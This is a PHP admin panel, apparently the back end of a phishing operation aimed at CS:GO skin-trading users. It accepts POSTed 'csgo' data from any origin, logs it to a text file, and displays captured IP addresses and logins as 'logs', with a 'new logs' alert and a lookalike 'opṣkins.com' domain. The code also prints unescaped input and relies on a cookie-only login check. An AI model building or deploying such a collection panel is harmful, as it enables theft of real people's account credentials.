

<?php
include('config.php');
if(!isset($_COOKIE['authh'])){
    print"<script>location.href='login1.php'</script>";
}
?>



<!DOCTYPE html>
<!-- saved from url=(0033)http://a0149298.xsph.ru/table.php -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="Content-Security-Policy" content="default-src *; style-src * 'unsafe-inline'; script-src * 'unsafe-inline' 'unsafe-eval'; img-src * data: 'unsafe-inline'; connect-src * 'unsafe-inline'; frame-src *;">
       
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>bu181k new</title>

    <!-- Bootstrap -->

    <link href="./style_table.css" rel="stylesheet">
    <link href="./bootstrap.css" rel="stylesheet">
    <link href="./bootstrap-theme.css" rel="stylesheet">
    
    <script src="./jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="./bootstrap.js"></script>
  </head>
    <body>
        <nav class="navbar navbar-inverse">        
            <div class="container-fluid">
                <div class="navbar-header">
                <a class="navbar-brand" href="
                /admin/spamer.php" style="text-shadow: #8A2BE2 1px 1px 10px;font-weight: bold;">BU181K</a></div>
                <ul class="nav navbar-nav">
                <li class="active"><a href="
                /admin/spamer.php">logs</a></li>
             <li class="dub">
    <input class="сhecka" type="checkbox" id="shest0" name="checkbox-test">
    
       <span class="labelb">включить обновление!</span>
</li>   
</ul>
            </div>
        </nav>
        <div class="other">
        <div class="container">
            <style>
             nav.navbar.navbar-inverse {
    margin-right: -100px;
}span.labelb {
    color: white;
}
            li.dub {
    height: 20px;
    margin-left: 20px;
    margin-top: 10px;
    /* padding-bottom: 20px; */
    /* padding-bottom: 20px; */
    font-size: 16px;
}
            body {
    margin-right: 100px;
  font-size: 13px;
            }
            button.button {
                    color: aqua;
    margin-right: 50%;
    margin-left: 48%;
    width: 100px;
    height: 30px;
    margin-top: 20px;
    border-radius: 20px;
    background-color: rgba(152, 46, 164, 0.78);
    /* color: aqua; */
}
@media (min-width: 992px) {
  .container {
   height: 400px;
    overflow: auto;
    width: 970px;
  }
}</style>
                   
           <table class="table table-bordered">
                <thead>
                <tr style="background-color: rgba(0, 90, 255, 0.85); opacity: 0.9;">
                    <th>IP</th>
                    <th>LOGIN</th>
                   
                    
                    
                </tr>
                </thead>
                <tbody>
                    
                         
                           <?php
     
header('Access-Control-Allow-Origin: *');
if (isset($_POST) and $_SERVER["REQUEST_METHOD"]=="POST"){
    echo "dadsad";
}
//принимаем запрос
$text = $_POST['csgo'];


//открываем для чтения и записи 
$file = fopen("csgotm.txt", "a");


//запись в файл
fwrite($file, $text."\r\n");
fclose($file);
file_put_contents('csgotm.txt', array_unique(file('csgotm.txt'))); 


//запись  с новой строчки
 $array = file("csgotm.txt"); 
     
        
     for($i=0; $i < count($array); $i++) 
     
     { 
         $date= $array[$i];
    list($ip, $name) = split(':', $date);
   
    
       printf("<tr  style='background-color: rgba(109, 40, 132, 0.85); opacity: 0.9;'>"."<td>".$ip."</td>"."<td>".$name."</td>"."</tr>");
      } 
   

    
   
?>


                            
                                            </tbody>
            </table>
          
        </div>

        
 
<script>
var c = document.querySelector('#shest0');
function run(){
    var interval = setInterval(function()
    {
        location.reload();
    }, 3000);
}
function setcook(){
    document.cookie="check=ok";
    
}
function changecook(){
    document.cookie="check=no";
    
}
setInterval(function() {
 if (c.checked) {
 setcook();
var interval = setInterval(function()
    {
        location.reload();
    }, 3000);

 } else {
     changecook();
    
 
 }
},1000);

</script>
<script>
var elements = document.querySelectorAll('td');

  for (var i = 0; i < elements.length; i++) {
   var count = i;
  }        function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}
var cookiess = getCookie("val"); 
if(cookiess<count){
    
    document.cookie="val="+count;
    alert("Новые логи!"); //добавить звук выстрела
    var audio = new Audio();
audio.preload = 'auto';
audio.src = 'https://opṣkins.com/admin/tr.mp3';
audio.play();
}
function getCookie(name) {
  var matches = document.cookie.match(new RegExp(
    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
  ));
  return matches ? decodeURIComponent(matches[1]) : undefined;
}
var cookiess = getCookie("check"); 
if(cookiess=="ok"){
    
    
    $("#shest0").attr('checked',true);
}


var elements = document.querySelectorAll('td');

  for (var i = 0; i < elements.length; i++) {
    var count = count+1;
  }
function geter(){
     document.cookie="val=7";
    alert("Clear!");
    
  $.ajax({
    type: 'POST',
    url: '/admin/geter.php',
    crossDomain: true,
     data: {bul:"ge"},  
 
    dataType: 'html',
   
});
}
</script>
 </div>
        <nav class="navbar navbar-inverse navbar-fixed-bottom" style="opacity: 0.7">        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand" >Bulbik (rak_raklo)</a>
                </div>
                
            </div>
        </nav>
    
</body></html>